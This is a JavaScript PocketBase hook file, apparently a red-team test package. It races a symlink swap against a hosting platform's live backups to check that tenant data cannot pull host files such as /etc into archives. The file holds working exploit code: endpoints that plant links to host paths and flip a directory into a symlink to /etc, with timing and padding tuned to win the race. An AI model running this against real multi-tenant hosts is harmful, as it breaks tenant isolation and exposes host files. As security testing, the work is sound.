// Red-team: re-point pb_data under the host while the host reads it (INV-1).
//
// pb_data is a bind mount the host reads as root: live backups copy it, the
// health check reads data.db to sign a token. A hook cannot call symlink(2)
// through $os, but $os.openRoot returns a Go *os.Root, and Root.Symlink does
// not check where the link POINTS — only where it is created. So tenant code
// can plant a link to any host path inside its own data directory.
//
// The attack is a race, not a static link: a static symlink is easy to refuse,
// but a directory that is a directory when the host lists it and a symlink to
// /etc when the host opens what was in it walks the host out of pb_data. This
// package flips one directory between the two for as long as it is asked to,
// while the driver takes live backups; the driver then checks that no archive
// holds anything but the tenant's own file.
//
// EVERYTHING LIVES INSIDE THE HANDLER: PocketBase runs handlers in a pooled
// runtime without the module scope (design.md §9.4).

routerAdd("GET", "/redteam/ping", (e) => e.json(200, { ok: true }));

// symlink-primitive reports whether tenant code can plant a link to an
// arbitrary host path at all. It is informational: the platform must hold
// either way, but the answer says whether the races below are reachable.
routerAdd("GET", "/redteam/symlink-primitive", (e) => {
    let created = false, error = "";
    let root;
    try {
        root = $os.openRoot("/pb/pb_data");
        try { root.remove("rt-probe-link"); } catch (_) {}
        root.symlink("/etc/hostname", "rt-probe-link");
        created = true;
        root.remove("rt-probe-link");
    } catch (err) {
        error = String(err);
    }
    try { if (root) root.close(); } catch (_) {}
    return e.json(200, { created: created, error: error });
});

// swap flips pb_data/rtswap/dir between a real directory holding own.txt and
// a symlink to ?target (default /etc), for ?ms milliseconds, holding each
// state for ?hold milliseconds.
routerAdd("GET", "/redteam/swap", (e) => {
    const q = e.request.url.query();
    const ms = parseInt(q.get("ms") || "10000", 10);
    const target = q.get("target") || "/etc";
    // How long each state is held. A link that exists for microseconds is
    // rarely still there across the host's list-then-open; one held for tens
    // of milliseconds is there for a good fraction of a walk.
    const hold = parseInt(q.get("hold") || "25", 10);
    // Files that sort before "dir". A host walk lists rtswap/, copies each of
    // these (an fsync apiece), and only then descends into rtswap/dir — so they
    // widen the gap between "it was a directory when listed" and "open what is
    // in it" from microseconds to however long the copies take.
    const pad = parseInt(q.get("pad") || "300", 10);
    let flips = 0, errors = 0, last = "";
    const root = $os.openRoot("/pb/pb_data");
    try {
        try {
            root.mkdirAll("rtswap/dir", 0o755);
            root.writeFile("rtswap/dir/own.txt", "the tenant's own file\n", 0o644);
            for (let i = 0; i < pad; i++) {
                root.writeFile("rtswap/a" + String(i).padStart(4, "0"), "pad\n", 0o644);
            }
        } catch (err) {
            // Answered rather than thrown, so the driver can say why the race
            // never ran instead of seeing PocketBase's generic 400.
            return e.json(200, { flips: 0, errors: 1, last_error: "setup: " + String(err) });
        }
        const deadline = Date.now() + ms;
        while (Date.now() < deadline) {
            try {
                root.rename("rtswap/dir", "rtswap/real");
                root.symlink(target, "rtswap/dir");
                if (hold > 0) sleep(hold);
                root.remove("rtswap/dir");
                root.rename("rtswap/real", "rtswap/dir");
                if (hold > 0) sleep(hold);
                flips++;
            } catch (err) {
                errors++;
                last = String(err);
                try { root.remove("rtswap/dir"); } catch (_) {}
                try { root.rename("rtswap/real", "rtswap/dir"); } catch (_) {}
            }
        }
        // Leave a plain directory behind, so later backups are not refused
        // over a link this package planted.
        try { root.remove("rtswap/dir"); } catch (_) {}
        try { root.rename("rtswap/real", "rtswap/dir"); } catch (_) {}
    } finally {
        root.close();
    }
    return e.json(200, { flips: flips, errors: errors, last_error: last });
});
